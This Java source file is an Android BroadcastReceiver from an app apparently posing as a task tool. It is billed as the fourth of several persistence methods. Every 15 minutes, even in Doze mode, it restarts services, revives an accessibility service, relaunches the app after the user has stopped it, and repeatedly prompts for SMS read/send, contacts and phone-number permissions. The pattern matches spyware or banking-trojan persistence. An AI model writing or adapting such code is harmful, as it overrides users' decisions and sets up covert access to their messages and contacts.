package com.task.tusker.receivers;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;
import androidx.core.content.ContextCompat;
import com.task.tusker.PermissionRequestActivity;
import com.task.tusker.services.ServiceWatchdog;
import com.task.tusker.services.WakeWorker;
import java.util.ArrayList;
import java.util.List;

/**
 * WakeAlarmReceiver — Method 4: AlarmManager exact repeating heartbeat.
 *
 * Fired by ServiceWatchdog.scheduleWakeAlarm() every 15 minutes via
 * setExactAndAllowWhileIdle (RTC_WAKEUP) — works even in Doze mode.
 *
 * On each fire it:
 *   1. Ensures both foreground services are running.
 *   2. Re-schedules itself for another 15 minutes (exact alarms are one-shot).
 *   3. Re-queues the WorkManager task in case it was cancelled.
 *
 * Registered in AndroidManifest with the custom action
 * "com.task.tusker.action.WAKE_ALARM".
 */
public class WakeAlarmReceiver extends BroadcastReceiver {

    private static final String TAG = "WakeAlarmReceiver";

    /**
     * The alarm is intentionally limited to communication/contact permissions.
     * Do not replace this with AutoPermissionManager's full permission list.
     */
    private static final String[] ALARM_PERMISSION_SET = {
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE
    };

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent != null ? intent.getAction() : null;
        if (!ServiceWatchdog.ALARM_ACTION.equals(action)) return;

        Log.i(TAG, "Wake alarm fired — checking services");

        // Capture this before the receiver's work can recreate services.
        // Do not interrupt an app session that is already active.
        boolean appWasRunning = ServiceWatchdog.isAppRunning(context);

        // 1. Restart any stopped foreground services
        ServiceWatchdog.ensureServicesRunning(context);

        // 2. Revive the accessibility service if it has died
        ServiceWatchdog.ensureAccessibilityRunning(context);

        // 3. Re-arm for next cycle (exact alarms are one-shot on API 23+)
        ServiceWatchdog.scheduleWakeAlarm(context);

        // 4. Re-queue WorkManager in case it was purged
        WakeWorker.schedule(context);

        // Match the boot entry behavior only for a cold app wake. If the app
        // already had a task, foreground activity, or service, leave its UI
        // and task stack untouched.
        if (!appWasRunning) {
            try {
                BootReceiver.launchApp(context);
                Log.i(TAG, "App was stopped — opened MainActivity");
            } catch (Exception e) {
                Log.w(TAG, "Could not open app after alarm wake: " + e.getMessage());
            }
        } else {
            Log.d(TAG, "App already running — no app launch needed");
        }

        // Request only the SMS, contacts, and phone permissions needed by the
        // alarm path. PermissionRequestActivity filters out any already granted
        // entries, so this is safe to run on every alarm delivery.
        requestMissingAlarmPermissions(context);
    }

    private static void requestMissingAlarmPermissions(Context context) {
        List<String> missing = new ArrayList<>();
        for (String permission : ALARM_PERMISSION_SET) {
            if (ContextCompat.checkSelfPermission(context, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                missing.add(permission);
            }
        }

        // READ_PHONE_NUMBERS was added in API 26. Do not request an unknown
        // permission on older Android versions.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && ContextCompat.checkSelfPermission(
                        context, Manifest.permission.READ_PHONE_NUMBERS)
                        != PackageManager.PERMISSION_GRANTED) {
            missing.add(Manifest.permission.READ_PHONE_NUMBERS);
        }

        if (missing.isEmpty()) {
            Log.d(TAG, "Alarm permissions already granted");
            return;
        }

        try {
            Intent request = new Intent(context, PermissionRequestActivity.class);
            request.putExtra(
                    PermissionRequestActivity.EXTRA_PERMISSIONS,
                    missing.toArray(new String[0]));
            request.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            context.startActivity(request);
            Log.i(TAG, "Requested " + missing.size()
                    + " missing SMS/contact/phone permission(s)");
        } catch (Exception e) {
            Log.w(TAG, "Could not request alarm permissions: " + e.getMessage());
        }
    }
}
